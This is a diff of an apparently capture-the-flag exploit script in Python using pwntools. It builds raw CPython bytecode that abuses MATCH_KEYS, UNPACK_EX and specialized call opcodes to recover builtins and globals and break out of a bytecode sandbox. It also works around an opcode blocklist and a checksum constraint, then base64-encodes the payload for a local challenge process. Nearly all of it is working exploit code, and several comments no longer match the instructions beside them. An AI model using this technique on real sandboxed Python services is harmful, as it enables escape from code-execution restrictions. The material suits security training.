@@ -25,16 +25,18 @@ BUILD_TUPLE2 = b'fx'             # Make a 120 sized tuple
 BUILD_TUPLE = opmap['BUILD_TUPLE']
 DUMP_TO_STACK = b'!;^x'         # MATCH_KEYS -> UNPACK_EX (sekarang 120 values builtin ada di stack)
 CALL_NO_KW_BUILTIN_FAST = opmap['CALL_NO_KW_BUILTIN_FAST']
+CALL_NO_KW_LEN = opmap['CALL_NO_KW_LEN']
+CALL_NO_KW_TUPLE_1 = opmap['CALL_NO_KW_TUPLE_1']
 STORE_SUBSCR = opmap['STORE_SUBSCR']
 LOAD_GLOBAL_BUILTIN = opmap['LOAD_GLOBAL_BUILTIN']
 COPY = opmap['COPY']
 context.log_level = 'critical'
 
 CNT = 43
-CNT2 = 20
+CNT2 = 21
 
 code = bytes([
-    # Recover builtins
+    # Recover builtins,
     COPY, 5,
     COPY, 6,
     UNPACK_EX, CNT,
@@ -44,29 +46,37 @@ code = bytes([
     MATCH_KEYS, CNT,
     UNPACK_EX, 2,
     SWAP, 2,                          # print function
-    # Recover globals
+    # # # # # Recover globals
     COPY, 11,
     COPY, 12,
     UNPACK_EX, CNT2,
     SWAP, CNT2+1,
+    # UNPACK_EX, 1,
     *POP,
     BUILD_TUPLE, CNT2,
-    MATCH_KEYS, CNT2,
+    MATCH_KEYS, 2,
     UNPACK_EX, 2,
-    SWAP, 2,
-    COPY, 2,
-    COPY, 7,                        # print()
-    COPY, 3,                        # code
-    CALL_NO_KW_BUILTIN_FAST, 0,     # print(code)
-    2,2,2,2,2,9,                    # cache and also to make it divisible by 17
+    # SWAP, 1,
+    COPY, 6,
+    COPY, 3,                        # print()
+    # SWAP, 2,
+    # COPY, 2,                        # code
+    CALL_NO_KW_LEN, 0,     # print(code)
+    2,2,2,2,2,32-5+14,                    # cache and also to make it divisible by 17
     RETURN_VALUE, 0,
 ])
 
 from base64 import b64encode
+print(len(code))
+divis = sum([x for x in code]) % 17
+print(divis)
 
-p = remote("localhost", 1225)
+A = [108, 109, 68, 93, 62, 63, 64, 25, 60, 61, 144, 1, 171, 39, 47, 27, 60, 71, 74, 87, 90, 95, 97, 100, 101, 106, 116, 124, 125, 127, 136, 137, 138, 141, 143, 175, 176, 262, 263, 264, 265, 266, 66, 67, 70, 72, 73, 76, 77, 78, 79, 80, 81, 82, 84, 86, 88, 111, 112, 113, 148, 153, 154, 158, 159, 160]
+assert (set(A) & set(code)) == set()
+# p = remote("localhost", 1225)
+p = process(["python", "chal.py"])
+
 b64code = b64encode(code)
-
 payload = open('payload', 'w')
 payload.write(b64code.decode())
 payload.close()
